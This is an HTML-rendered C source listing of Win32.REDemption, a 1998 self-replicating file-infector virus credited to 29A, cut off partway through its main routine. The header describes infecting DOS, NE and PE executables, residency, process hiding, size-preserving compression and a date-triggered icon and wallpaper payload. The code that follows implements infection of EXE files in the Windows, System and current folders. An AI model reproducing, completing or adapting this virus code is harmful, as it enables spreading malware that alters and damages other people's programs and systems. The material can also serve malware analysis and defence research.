<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Win32.Redemption.a - WIN32RED.C.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
Win32.REDemption.9216 virus.
(c) 1998. Jacky Qwerty/29A.

Description

This is a resident HLL (High Level Language) Win32 appender virus
written in C. It infects all sort of EXE files: DOS EXE files, NE files,
PE files from Win32 (Win95/NT), etc. Infected files only spread in Win32
platforms, including Win3.x with Win32s subsystem. The virus infects
EXE files by changing the pointer at 3Ch in the MZ header which points
to the new EXE header (if any) placing another pointer to the virus own
PE header attached at the end of the file. When the virus executes, it
infects all EXE files from Windows, System and current folder. Then it
spawns itself as another task (thus staying resident), makes itself
invisible (thus becoming unloadable) and periodically searches for non-
infected EXE files in all drives, infecting them in the background.

Most interesting feature of this virus is that infected files don't
grow at all, that is, files have same size before and after infection.
The virus compresses part of its host by using own JQCODING algorithm.
It also copies host icon to its own resource section to show original icon.
The virus has no problems related to finding the KERNEL32 base address
and its API functions. This is because all API functions are imported
implicitly from the virus own import table. The virus takes special care
of patching appropriately all RVA and RAW fields from its own PE header,
including code, data, imports, relocations and resource sections. This
is needed for the virus to spread succesfully through all kinds of hosts.

Payload

On October the 29th, the virus replaces the main icon of all infected
programs with its own icon, a 29A logo. It also changes default
desktop wallpaper to such logo.

To build

Just run the BUILD.BAT file to build release version. VC++ 6.0 compiler
was used since it proved to optimize better than Borland's or Watcom's.

Greets

Greets go to all 29Aers, especially Vecna and Griyo for all their
*kickass* stuff and their special effort during this 29A #3 issue.

Disclaimer

This source code is provided for educational purposes only. The author is
NOT responsible in any way, for problems it may cause due to improper use!

(c) 1998. Jacky Qwerty/29A.
*/</span><span class="sc0">

</span><span class="sc9">#define WIN32_LEAN_AND_MEAN
</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
</span><span class="sc0">
</span><span class="sc9">#ifdef tsr
#include "win95sys.h"
#endif
</span><span class="sc0">
</span><span class="sc9">#ifdef compr
#include "jqcoding.h"
#endif
</span><span class="sc0">
</span><span class="sc9">#ifdef icon
#include "winicons.h"
#include "winres.h"
#endif
</span><span class="sc0">

</span><span class="sc2">//constants..
</span><span class="sc0">
</span><span class="sc9">#ifdef _MSC_VER                                </span><span class="sc2">// Microsoft VC++
</span><span class="sc9">#  ifdef release
#    define DATA_SECTION_RAW    0x200  </span><span class="sc2">//0xE00
</span><span class="sc9">#  else
#    define DATA_SECTION_RAW    0x1400  </span><span class="sc2">//0x1600
</span><span class="sc9">#  endif
#  define COMPILER_DATA         0  </span><span class="sc2">//0x30 (VC++4)
</span><span class="sc9">#  define SIZEOF_RESOURCE_DATA  0x504
#endif
</span><span class="sc0">
</span><span class="sc9">#ifdef __BORLANDC__                            </span><span class="sc2">// Borland C++
</span><span class="sc9">#  ifdef release
#    define DATA_SECTION_RAW    ?  </span><span class="sc2">//0x1000
</span><span class="sc9">#    define COMPILER_DATA       0
#  else
#    define DATA_SECTION_RAW    ?  </span><span class="sc2">//0x6200
</span><span class="sc9">#    define COMPILER_DATA       0x74
#  endif
#  define SIZEOF_RESOURCE_DATA  ?
#endif
</span><span class="sc0">
</span><span class="sc9">#define VIRUS_SIZE    (FILE_SIZE - PE_HEADER_OFFSET)
</span><span class="sc0">
</span><span class="sc9">#define STARTOF_CODEDATA (DATA_SECTION_RAW + COMPILER_DATA -\
                            PE_HEADER_OFFSET)
#define RawSelfCheck     (STARTOF_CODEDATA + sizeof(szCopyright) - 5)
</span><span class="sc0">
</span><span class="sc9">#define INIT_VARS_OFFSET (STARTOF_CODEDATA + sizeof(szCopyright) +\
                            sizeof(szExts) + 3 &amp; -4)
#ifdef tsr
#define RawProgType      INIT_VARS_OFFSET
#define RawSrcVir        (RawProgType + 4)
#else
#define RawSrcVir        INIT_VARS_OFFSET
#endif
#define RawOldPtr2NewEXE (RawSrcVir + 4)
#define RawOldFileSize   (RawOldPtr2NewEXE + 4)
#ifdef compr
#define RawnComprSize    (RawOldFileSize + 4)
#define RawCipherTarget  (RawnComprSize + 4)
#define TmpVal RawCipherTarget
#else
#define TmpVal RawOldFileSize
#endif
#ifdef icon
#define RawOldResourceAddr  (TmpVal + 4)
#endif
</span><span class="sc0">
</span><span class="sc9">#ifndef compr
#define SIZE_PAD         101
#endif
#define READ_ONLY        FALSE
#define WRITE_ACCESS     TRUE
#define SIZEOF_FILEEXT   3
#define MAX_FILESIZE     0x4000000  </span><span class="sc2">//64 MB
</span><span class="sc9">#ifdef compr
#define MIN_FILESIZE     0x4000     </span><span class="sc2">//16 KB
</span><span class="sc9">#endif
#define PREV_LAPSE       3   </span><span class="sc2">//1 * 60  //10 * 60  //seconds
</span><span class="sc9">#define SEEK_LAPSE       3   </span><span class="sc2">//5       //30       //seconds
</span><span class="sc0">

</span><span class="sc2">//macros..
</span><span class="sc0">
</span><span class="sc9">#define Rva2Ptr(Type, Base, RVA) ((Type)((DWORD)(Base) + (DWORD)(RVA)))
</span><span class="sc0">
</span><span class="sc9">#define IsFile(pFindData) (!((pFindData)-&gt;dwFileAttributes &amp;\
                               FILE_ATTRIBUTE_DIRECTORY))
#define IsFolder(pFindData) (!IsFile(pFindData) &amp;&amp;\
                                (pFindData)-&gt;cFileName[0] != '.')
</span><span class="sc0">
</span><span class="sc9">#define PushVar(Object) __asm push (Object)
#define PopVar(Object) __asm pop (Object)
</span><span class="sc0">

</span><span class="sc2">//type definitions..
</span><span class="sc0">
</span><span class="sc9">#ifdef tsr
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">PROG_TYPE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PPROG_TYPE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#define TSR_COPY        0
#define HOST_COPY       1
#endif
</span><span class="sc0">
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">BOOLB</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_IMAGE_RELOCATION_DATA</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">  </span><span class="sc2">// not defined in winnt.h
</span><span class="sc0">  </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">RelocOffset</span><span class="sc0"> </span><span class="sc10">:</span><span class="sc4">12</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">WORD</span><span class="sc0"> </span><span class="sc11">RelocType</span><span class="sc0">   </span><span class="sc10">:</span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">IMAGE_RELOCATION_DATA</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PIMAGE_RELOCATION_DATA</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc9">#ifdef icon
</span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_ICONIMAGES</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">PICONIMAGE</span><span class="sc0"> </span><span class="sc11">pLargeIcon</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">PICONIMAGE</span><span class="sc0"> </span><span class="sc11">pSmallIcon</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0"> </span><span class="sc11">ICONIMAGES</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">PICONIMAGES</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">

</span><span class="sc2">//global variables..
</span><span class="sc0">
</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"(c) Win32.REDemption (C ver.1.0) by JQwerty/29A"</span><span class="sc10">,</span><span class="sc0">
     </span><span class="sc11">szExts</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"eXeSCr"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef tsr
</span><span class="sc11">PROG_TYPE</span><span class="sc0"> </span><span class="sc11">ProgType</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">HOST_COPY</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">SrcVir</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">PE_HEADER_OFFSET</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OldPtr2NewEXE</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">OldFileSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FILE_SIZE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef compr
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">nComprSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CipherTarget</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
#ifdef icon
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">OldResourceAddr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">RESOURCE_SECTION_RVA</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#include "jq29aico.h"
#endif
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">ExitCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifndef compr
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">_TgtVir</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">CipherSource</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">_RvaDelta</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hHandle1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">hHandle2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">HostName</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">TmpName</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">FindData</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FindDataTSR</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">STARTUPINFO</span><span class="sc0"> </span><span class="sc11">StartupInfo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc11">PROCESS_INFORMATION</span><span class="sc0"> </span><span class="sc11">ProcessInfo</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">PIMAGE_DOS_HEADER</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pHostMZ</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">PIMAGE_NT_HEADERS</span><span class="sc0"> </span><span class="sc11">_pHostPE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef msgbox
</span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">CancelFolderSeek</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">CancelFileSeek</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#ifdef tsr
</span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hMutex</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
#endif
#ifdef icon
</span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">bPayLoadDay</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY</span><span class="sc0"> </span><span class="sc11">pRsrcStart</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">HostLargeIcon</span><span class="sc10">[</span><span class="sc11">SIZEOF_LARGE_ICON</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">HostSmallIcon</span><span class="sc10">[</span><span class="sc11">SIZEOF_SMALL_ICON</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc9">#endif
#ifdef compr
</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">ComprMem</span><span class="sc10">[</span><span class="sc4">0x10000</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc9">#ifdef icon
#define SIZEOF_BMP 0x8076 </span><span class="sc2">//32Kb + Bitmap header..
</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc11">jq29aBmp</span><span class="sc10">[</span><span class="sc11">SIZEOF_BMP</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
</span><span class="sc9">#endif
#endif
</span><span class="sc0">
</span><span class="sc9">#define sz29A (szCopyright + sizeof(szCopyright) - 4)
#define szJQ (szCopyright + sizeof(szCopyright) - 12)
</span><span class="sc0">

</span><span class="sc2">//function declarations..
</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">Win32Red</span><span class="sc10">(</span><span class="sc11">VOID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">OpenMapFile</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">FileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">WriteAccess</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">CloseTruncFile</span><span class="sc10">(</span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">WriteAccess</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">InfectPath</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">cBytes</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">CloseUnmapFile</span><span class="sc10">(</span><span class="sc11">BOOLB</span><span class="sc0"> </span><span class="sc11">WriteAccess</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">GetEndOfPath</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pTgt</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">pSr</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">PVOID</span><span class="sc0"> </span><span class="sc11">Rva2Raw</span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">Rva</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#ifdef icon
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">FixResources</span><span class="sc10">(</span><span class="sc11">PIMAGE_RESOURCE_DIRECTORY</span><span class="sc0"> </span><span class="sc11">pRsrcDir</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">GetDefaultIcons</span><span class="sc10">(</span><span class="sc11">PICONIMAGES</span><span class="sc0"> </span><span class="sc11">pIconImages</span><span class="sc10">,</span><span class="sc0">
                      </span><span class="sc11">PVOID</span><span class="sc0"> </span><span class="sc11">pNEorPE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
#ifdef tsr
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">ExecTemp</span><span class="sc10">(</span><span class="sc11">PROG_TYPE</span><span class="sc0"> </span><span class="sc11">ProgType</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__inline</span><span class="sc0"> </span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">SeekTSR</span><span class="sc10">(</span><span class="sc11">VOID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">WalkFolder</span><span class="sc10">(</span><span class="sc11">PBYTE</span><span class="sc0"> </span><span class="sc11">PathName</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0">  </span><span class="sc11">HideProcess</span><span class="sc10">(</span><span class="sc11">VOID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__inline</span><span class="sc0"> </span><span class="sc11">PPROCESS_DATABASE</span><span class="sc0"> </span><span class="sc11">GetProcessDB</span><span class="sc10">(</span><span class="sc11">VOID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">__inline</span><span class="sc0"> </span><span class="sc11">PTHREAD_DATABASE</span><span class="sc0">  </span><span class="sc11">GetThreadDB</span><span class="sc10">(</span><span class="sc11">VOID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#else
</span><span class="sc11">__inline</span><span class="sc0"> </span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">ExecTemp</span><span class="sc10">(</span><span class="sc11">VOID</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc0">

</span><span class="sc2">//function definitions..
</span><span class="sc0">
</span><span class="sc11">VOID</span><span class="sc0"> </span><span class="sc11">Win32Red</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc9">#ifdef tsr
</span><span class="sc0">  </span><span class="sc9">#ifndef msgbox
</span><span class="sc0">    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hMutex</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc11">HideProcess</span><span class="sc10">();</span><span class="sc0">
  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc9">#ifdef icon
</span><span class="sc0">  </span><span class="sc9">#include "payload.c"
</span><span class="sc0">  </span><span class="sc9">#endif
</span><span class="sc0">  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HostName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0">
      </span><span class="sc11">OpenMapFile</span><span class="sc10">(</span><span class="sc11">HostName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">READ_ONLY</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">pHostMZ</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pMZ</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PushVar</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//better pushin/popin than usin a temp. var.
</span><span class="sc0">    </span><span class="sc11">PushVar</span><span class="sc10">(</span><span class="sc11">hHandle2</span><span class="sc10">);</span><span class="sc0">  </span><span class="sc2">//better pushin/popin than usin a temp. var.
</span><span class="sc0">    </span><span class="sc11">SrcVir</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DWORD</span><span class="sc10">)</span><span class="sc11">pMZ</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc9">#ifdef tsr
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ProgType</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">TSR_COPY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">      </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Non-resident stage.."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc9">#ifdef compr
</span><span class="sc0">      </span><span class="sc11">PushVar</span><span class="sc10">(</span><span class="sc11">nComprSize</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">PushVar</span><span class="sc10">(</span><span class="sc11">CipherTarget</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc11">InfectPath</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x7F</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc11">InfectPath</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0x7F</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc11">InfectPath</span><span class="sc10">(</span><span class="sc11">PathName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">PathName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">));</span><span class="sc0">
      </span><span class="sc9">#ifdef compr
</span><span class="sc0">      </span><span class="sc11">PopVar</span><span class="sc10">(</span><span class="sc11">CipherTarget</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">PopVar</span><span class="sc10">(</span><span class="sc11">nComprSize</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc9">#ifdef tsr
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">hMutex</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateMutex</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szJQ</span><span class="sc10">)))</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">GetLastError</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_ALREADY_EXISTS</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc9">#if 1
</span><span class="sc0">        </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">          </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TSR: Mutex exists!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">),</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc9">#endif
</span><span class="sc0">          </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hMutex</span><span class="sc10">),</span><span class="sc0">
          </span><span class="sc11">ExitProcess</span><span class="sc10">(</span><span class="sc11">ExitCode</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#if 1
</span><span class="sc0">        </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">        </span><span class="sc5">else</span><span class="sc0">
          </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TSR: Mutex created!"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#endif
</span><span class="sc0">        </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">      </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Resident stage.."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">      </span><span class="sc11">SeekTSR</span><span class="sc10">();</span><span class="sc0">
      </span><span class="sc9">#ifdef msgbox
</span><span class="sc0">      </span><span class="sc11">MessageBox</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TSR: bye bye.."</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szCopyright</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MB_OK</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc9">#endif
</span><span class="sc0">    </span><span class="sc11">PopVar</span><span class="sc10">(</span><span class="sc11">hHandle2</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">//better pushin/popin than usin a temp. var.
</span><span class="sc0">    </span><span class="sc11">PopVar</span><span class="sc10">(</span><span class="sc11">hHandle1</span><span class="sc10">);</span><span class="sc0">   </span><span class="sc2">//better pushin/popin than usin a temp. var.
</span><span class="sc0">    </span><span class="sc11">pMZ</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">pHostMZ</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">CloseUnmapFile</span><span class="sc10">(</span><span class="sc11">READ_ONLY</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc9">#ifdef tsr
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ProgType</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">TSR_COPY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">hMutex</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">OpenMutex</span><span class="sc10">(</span><span class="sc11">MUTEX_ALL_ACCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szJQ</span><span class="sc10">)))</span><span class="sc0">
        </span><span class="sc9">#ifndef msgbox
</span><span class="sc0">        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hMutex</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc9">#else
</span><span class="sc0">        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hMutex</span><span class="sc10">),</span><span class="sc0">
